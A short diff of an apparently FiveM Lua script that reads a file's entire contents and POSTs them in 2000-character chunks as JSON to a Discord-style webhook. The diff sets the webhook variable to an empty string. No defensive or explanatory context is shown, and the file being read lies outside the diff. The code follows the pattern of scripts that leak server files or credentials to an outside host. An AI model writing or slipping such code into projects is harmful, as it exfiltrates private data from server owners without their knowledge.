@@ -3,6 +3,7 @@ a = file:read("*a")
 b = a
 xd = ''
 limite = 2000
+webhook = ''
 for i = 1, string.len(b) do
     xd = xd .. string.sub(b, i, i)
     if i == limite then 
@@ -19,6 +20,7 @@ PerformHttpRequest(webhook,
 function(err, text, headers) end, 'POST', 
 json.encode({username = "aa", content = xd}), 
 { ['Content-Type'] = 'application/json' })
+
 
 
 
